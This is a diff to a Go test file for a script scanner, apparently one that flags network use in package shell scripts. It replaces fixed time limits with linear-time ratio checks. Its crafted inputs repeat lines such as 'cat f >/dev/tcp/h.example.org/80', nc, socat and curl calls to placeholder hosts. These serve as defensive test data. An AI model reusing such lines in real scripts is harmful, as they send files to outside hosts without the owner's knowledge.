@@ -946,18 +946,72 @@ func TestS6ReadsAChainedVariable(t *testing.T) {
 	})
 }
 
+// s6ScansInLinearTime checks that S6 reads a crafted script in time linear
+// in its size. build(n) is a script of n repetitions of one shape.
+//
+// The check compares times measured in the same run instead of bounding one
+// against the clock: a busy machine slows both alike, where a fixed limit is
+// missed by whatever else is running. Reading one script of eight units
+// takes as long as reading a script of one unit eight times when the time is
+// linear in the length, and eight times as long when it is quadratic (or far
+// longer, at these sizes). The two sides run for about the same time, so a
+// busy machine disturbs them alike. Each is measured several times,
+// interleaved, with the fastest of each compared, and a comparison that fails
+// is made again: reading in quadratic time exceeds the limit every time, a
+// pause on a busy machine does not.
+func s6ScansInLinearTime(t *testing.T, name string, unit int, build func(n int) string) {
+	t.Helper()
+	const (
+		factor   = 8
+		rounds   = 3
+		attempts = 3
+		// Between linear (1) and quadratic (8) growth, above the spread of
+		// linear readings on a machine running far more than it has cores.
+		limit = 5.0
+	)
+	manifest := `{"capabilities":{"exec":{"commands":["x"]}}}`
+	small := map[string]string{"run.sh": "#!/bin/sh\n" + build(unit) + "\n"}
+	large := map[string]string{"run.sh": "#!/bin/sh\n" + build(unit*factor) + "\n"}
+	read := func(files map[string]string, times int) time.Duration {
+		start := time.Now()
+		for range times {
+			s6Run(t, manifest, files)
+		}
+		return max(time.Since(start), time.Nanosecond)
+	}
+	fastest := func(best, d time.Duration) time.Duration {
+		if best == 0 || d < best {
+			return d
+		}
+		return best
+	}
+	var ratios []float64
+	for range attempts {
+		var smallBest, largeBest time.Duration
+		for range rounds {
+			smallBest = fastest(smallBest, read(small, factor))
+			largeBest = fastest(largeBest, read(large, 1))
+		}
+		ratio := float64(largeBest) / float64(smallBest)
+		if ratio <= limit {
+			t.Logf("%s: the long script took %.2f times as long as the short one repeated", name, ratio)
+			return
+		}
+		ratios = append(ratios, ratio)
+	}
+	t.Errorf("%s: reading one script %d times as long took %.1f times as long as reading the short one %d times, in each of %d comparisons; linear reading takes about as long",
+		name, factor, ratios, factor, attempts)
+}
+
 // Deep substitutions and thousands of references stay linear: the caps
 // keep these shapes fast.
 func TestS6CraftedLinesStayFast(t *testing.T) {
-	deep := strings.Repeat("$(echo ", 20000) + "ssh admin@prod.example.org" + strings.Repeat(")", 20000)
-	many := "A=prod.example.org\ncurl -s https://get.example.test/ " + strings.Repeat("$A ", 60000) + "\n"
-	for name, script := range map[string]string{"deep": deep + "\n", "many": many} {
-		start := time.Now()
-		s6Run(t, `{"capabilities":{"exec":{"commands":["x"]}}}`, map[string]string{"run.sh": "#!/bin/sh\n" + script})
-		if d := time.Since(start); d > 3*time.Second {
-			t.Errorf("%s took %v", name, d)
-		}
-	}
+	s6ScansInLinearTime(t, "deep", 2500, func(n int) string {
+		return strings.Repeat("$(echo ", n) + "ssh admin@prod.example.org" + strings.Repeat(")", n)
+	})
+	s6ScansInLinearTime(t, "many", 7500, func(n int) string {
+		return "A=prod.example.org\ncurl -s https://get.example.test/ " + strings.Repeat("$A ", n)
+	})
 }
 
 // A variable assigned on one line and used on a network line on another.
@@ -1333,21 +1387,16 @@ func TestS6IPv6ThatIsNotAHost(t *testing.T) {
 // The new readers run on the attacker's text: long operand lists and deep
 // nesting stay fast.
 func TestS6NetworkFormsStayFast(t *testing.T) {
-	ops := strings.Repeat("git@h.example.org:o/r.git ", 40000)
-	redirs := strings.Repeat(">/dev/tcp/h.example.org/80 ", 40000)
-	nested := strings.Repeat("$(echo ", 20000) + "cat f >/dev/tcp/h.example.org/80" + strings.Repeat(")", 20000)
-	for name, script := range map[string]string{
-		"git":      "git clone " + ops,
-		"docker":   "docker pull " + strings.Repeat("registry.example.org:5000/img ", 40000),
-		"socat":    "socat " + strings.Repeat("TCP:h.example.org:80 ", 40000),
-		"redirect": "cat f " + redirs,
-		"ipv6":     "nc " + strings.Repeat("2001:db8::1 ", 40000),
-		"nested":   nested,
-	} {
-		start := time.Now()
-		s6Run(t, `{"capabilities":{"exec":{"commands":["x"]}}}`, map[string]string{"run.sh": "#!/bin/sh\n" + script + "\n"})
-		if d := time.Since(start); d > 3*time.Second {
-			t.Errorf("%s took %v", name, d)
-		}
+	repeated := func(prefix, operand string) func(n int) string {
+		return func(n int) string { return prefix + strings.Repeat(operand, n) }
 	}
+	const unit = 5000
+	s6ScansInLinearTime(t, "git", unit, repeated("git clone ", "git@h.example.org:o/r.git "))
+	s6ScansInLinearTime(t, "docker", unit, repeated("docker pull ", "registry.example.org:5000/img "))
+	s6ScansInLinearTime(t, "socat", unit, repeated("socat ", "TCP:h.example.org:80 "))
+	s6ScansInLinearTime(t, "redirect", unit, repeated("cat f ", ">/dev/tcp/h.example.org/80 "))
+	s6ScansInLinearTime(t, "ipv6", unit, repeated("nc ", "2001:db8::1 "))
+	s6ScansInLinearTime(t, "nested", 2500, func(n int) string {
+		return strings.Repeat("$(echo ", n) + "cat f >/dev/tcp/h.example.org/80" + strings.Repeat(")", n)
+	})
 }
